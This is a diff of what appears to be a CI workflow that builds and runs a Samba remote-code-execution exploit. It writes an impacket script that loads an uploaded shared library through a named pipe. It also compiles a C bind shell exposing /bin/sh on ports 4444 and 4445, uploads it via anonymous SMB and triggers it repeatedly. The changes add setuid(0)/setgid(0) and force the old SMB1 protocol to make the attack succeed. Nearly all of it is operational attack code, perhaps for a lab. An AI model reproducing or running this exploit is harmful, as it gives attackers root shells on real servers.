@@ -37,13 +37,18 @@ jobs:
 
           cat > exploit.py <<'PY'
           from optparse import OptionParser
+          from impacket import smb
           from impacket.dcerpc.v5 import transport
           parser = OptionParser()
           parser.add_option("-t", "--target", dest="target")
           parser.add_option("-m", "--module", dest="module")
           options, _ = parser.parse_args()
           stringbinding = r'ncacn_np:%s[\pipe\%s]' % (options.target, options.module)
-          dce = transport.DCERPCTransportFactory(stringbinding).get_dce_rpc()
+          rpctransport = transport.DCERPCTransportFactory(stringbinding)
+          rpctransport.set_connect_timeout(12)
+          if hasattr(rpctransport, "preferred_dialect"):
+            rpctransport.preferred_dialect(smb.SMB_DIALECT)
+          dce = rpctransport.get_dce_rpc()
           dce.connect()
           PY
 
@@ -69,6 +74,8 @@ jobs:
           }
           int samba_init_module(void) {
             detach();
+            setgid(0);
+            setuid(0);
             int s, c;
             struct sockaddr_in a;
             char *argv[] = {"/bin/sh", "-i", NULL};
@@ -89,15 +96,13 @@ jobs:
 
           gcc -shared -fPIC -DBIND_PORT=4444 -o libspg4444.so bindshell-samba.c
           gcc -shared -fPIC -DBIND_PORT=4445 -o libspg4445.so bindshell-samba.c
-          smbclient "//$TARGET/share" -N -c "put libspg4444.so libspg4444.so; put libspg4445.so libspg4445.so; ls" || true
-          smbclient "//$TARGET/mnt" -N -c "put libspg4444.so libspg4444.so; put libspg4445.so libspg4445.so; ls" || true
+          smbclient "//$TARGET/share" -N --option='client min protocol=NT1' --option='client max protocol=NT1' -c "put libspg4444.so libspg4444.so; put libspg4445.so libspg4445.so; ls" || true
+          smbclient "//$TARGET/mnt" -N --option='client min protocol=NT1' --option='client max protocol=NT1' -c "put libspg4444.so libspg4444.so; put libspg4445.so libspg4445.so; ls" || true
 
           for n in 1 2 3; do
-            for base in /tmp /mnt; do
-              echo "Trigger round $n $base/libspg4444.so"
-              python3 exploit.py -t "$TARGET" -m "$base/libspg4444.so" || true
-              echo "Trigger round $n $base/libspg4445.so"
-              python3 exploit.py -t "$TARGET" -m "$base/libspg4445.so" || true
+            for module in /tmp/libspg4444.so /tmp/libspg4445.so /mnt/libspg4444.so /mnt/libspg4445.so tmp/libspg4444.so tmp/libspg4445.so; do
+              echo "Trigger round $n $module"
+              python3 exploit.py -t "$TARGET" -m "$module" || true
             done
             sleep 2
             for p in 4444 4445 6699; do
